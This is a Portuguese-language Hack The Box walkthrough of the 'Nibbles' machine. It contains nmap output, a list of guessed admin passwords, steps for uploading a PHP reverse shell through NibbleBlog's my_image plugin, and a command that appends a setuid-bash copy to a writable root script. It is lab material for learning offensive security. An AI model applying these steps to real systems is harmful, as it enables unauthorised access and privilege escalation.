---
title:     "Hack The Box - Nibbles"
tags: [linux,easy, CVE 2015-6967, rootbash]
categories: Linux
---

![1.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-nibbles/1.jpg)

## Enumeration

Iniciamos o processo de enumeracao...

```
# Nmap 7.80 scan initiated Mon Jul 13 18:51:10 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/HTB-Linux/nibbles/results/10.10.10.75/scans/_quick_tcp_nmap.txt -oX /root/HTB-Linux/nibbles/results/10.10.10.75/scans/xml/_quick_tcp_nmap.xml 10.10.10.75
Nmap scan report for 10.10.10.75
Host is up, received user-set (0.13s latency).
Scanned at 2020-07-13 18:51:11 EDT for 15s
Not shown: 998 closed ports
Reason: 998 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 13 18:51:26 2020 -- 1 IP address (1 host up) scanned in 15.55 seconds
```

Encontro duas portas abertas.... 80 e 22

Acessando o server apache na porta 80 encontro uma simples msg...

![2.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-nibbles/2.jpg)

Olhando o source encontro um comentario que nos leva a uma applicacao `Nibblesblog`

![3.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-nibbles/3.jpg)

Accessando a aplicacao e pesquisando sobre ela, encontro duas exploracoes... se for a versao 3 existe multiplos `sqli` se for a 4 eu preciso de um usuario e senha para explorar.

entao, verifiquei logo se era possovel sqli mas depois de verificar, vi que nao era... entao, restava obter uma login valido..

tentei, varias WORDLISTS mas sem sucesso... a aplicacao sempre me bloqueava depois de algumas tentativas...

Resolvi entao, fazer manualmente algo do tipoo

```
admin:admin
admin:123456
admin:nibbles
admin:12345678                       --->>> LEMBRE-SE DE TENTAR O MAXIMO DE SENHAS (empresa@2020, nomedamaquina, UPPER, lower e etc.. AS pessoas costumam usar senhas faceis)
admin:password
admin:Passw0rd
admin:passw0rd!
```

na terceira tentativa eu consigo o acesso que precisava com o `admin:nibbles` , agora usanso a exploracao para a versao 4 de acordo com esse site, obtenho rapidamente uma reverse shell..

## Reverse Shell

***reference*** https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html


1 - acesse http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image
2 -  em seguida, localize em seu kali um shell em php `locate php-reverse`
3 -  edite com seu ip e a porta desejada.
4 - ative o listen  na porta escolhida 
5 - faca o uplload da reverse shell
6 - e acesse sua reverse nesse link..  http://10.10.10.75/nibbleblog/content/private/plugins/my_image/

![4.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-nibbles/4.jpg)

agora que temos nossa shell vamos escalar nossos privilegios

## Privilege Escalation

Usando algums tools para agilizaar o processo de PE encontro algo interessante, 

![5.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-nibbles/5.jpg)

entao, depois de extrair tenho acesso ao arquivo `monitor.sh`

adicionei uma nova linha nesse arquivo com o seguinte comando

`echo "cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash" >> monitor.sh`

logo em seguida executei

![7.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-nibbles/7.jpg)

navego entao ate o `\tmp` dou permissao de execucao ao nosso `rootbash` usando o seguinte comando `chmod +x rootbash`

e entao depois de ter feito isso, eh so executar `rootbash -p`

![8.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-nibbles/8.jpg)




